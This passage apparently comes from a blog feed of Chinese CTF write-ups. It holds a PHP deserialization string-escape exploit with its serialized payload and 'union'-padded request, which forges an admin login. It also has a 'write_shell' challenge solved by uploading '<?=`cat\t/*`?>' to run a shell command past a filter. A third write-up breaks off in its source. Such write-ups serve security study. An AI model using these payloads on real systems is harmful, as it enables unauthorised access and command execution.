comment" spellcheck="true">//å±</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"0-0"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">Class</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$newInfo</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$upDate</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¿žæŽ¥å¤±è´¥ï¼Œé”™è¯¯:"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">==</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'ç”¨æˆ·ä¸å­˜åœ¨!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'å¯†ç é”™è¯¯ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//è¿˜æ²¡æ¥å¾—åŠå†™</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="expï¼š"><a href="#expï¼š" class="headerlink" title="expï¼š"></a>expï¼š</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre><code>";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}</code></pre><pre><code>age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜Žè°·CTFï¼šwrite_shell</title>
      <link href="2021/09/01/hong-ming-gu-ctf-write-shell/"/>
      <url>2021/09/01/hong-ming-gu-ctf-write-shell/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/'| |_|php|;|~|\\^|\\+|eval|{|}/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// if(preg_match("/'| |_|=|php/",$input)){</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">'sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"action"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'pwd'</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">'upload'</span><span class="token punctuation">:</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"$dir"</span> <span class="token punctuation">.</span> <span class="token string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œactionä¸ºpwdæ—¶ï¼Œä¼šæ‰“å°å½“å‰çš„ç›®å½•è·¯å¾„ï¼›actionä¸ºuploadæ—¶ï¼Œä¼šä¸Šä¼ æ•°æ®åˆ°ç›®å½•è·¯å¾„ä¸‹çš„index.phpä¸­ï¼Œå¹¶ä¸”ä¼šå¯¹ä¸Šä¼ çš„æ•°æ®è¿›è¡Œæ£€æŸ¥</p><p>åœ¨checkå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥çš„æ•°æ®ä¸å¯ä»¥åŒ…å« â€˜ â€™ï¼Œâ€™_â€™, â€˜phpâ€™, â€˜evalâ€™, â€˜{â€˜, â€˜}â€™ æ²¡è¿‡æ»¤åå¼•å·ï¼Œæ¬¸å˜¿ï¼Œçªç ´å£æ‰¾åˆ°äº†</p><p>å…ˆçœ‹çœ‹å½“å‰æ–‡ä»¶è·¯å¾„</p><p><img src="/2021/09/01/hong-ming-gu-ctf-write-shell/image-20210901161445914.png" alt="image-20210901161445914"></p><pre><code>?action=upload&amp;data=&lt;?=`cat\t/*`?&gt;</code></pre><p><img src="/2021/09/01/hong-ming-gu-ctf-write-shell/image-20210901161513328.png" alt="image-20210901161513328"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯ï¼š2020-Novel</title>
      <link href="2021/08/26/wang-ding-bei-2020-novel/"/>
      <url>2021/08/26/wang-ding-bei-2020-novel/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/26/wang-ding-bei-2020-novel/image-20210824030132161.png" alt="image-20210824030132161"></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span><span class="token delimiter">&lt;?php</span><span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">'DS'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'DS'</span><span class="token punctuation">,</span> <span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'APP_DIR'</span><span class="token punctuation">,</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">autoload_class</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">APP_DIR</span><span class="token punctuation">.</span><span class="token constant">DS</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token constant">DS</span><span class="token punctuation">.</span><span class="token variable">$class</span><span class="token punctuation">.</span><span class="token string">'.class.php'</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//echo $file;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//echo $file;</span>            <span class="token keyword">include_once</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$upload_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'method'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$upload_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$param</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token variable">$param</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// var_dump($upload_config);</span>    <span class="token keyword">return</span> <span class="token variable">$upload_config</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$home_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$home_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$home_config</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'dest'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'dest'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$copy_config</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token string">'autoload_class'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$request</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">'/'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'get'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">;</span><span class="token variable">$parameters</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token 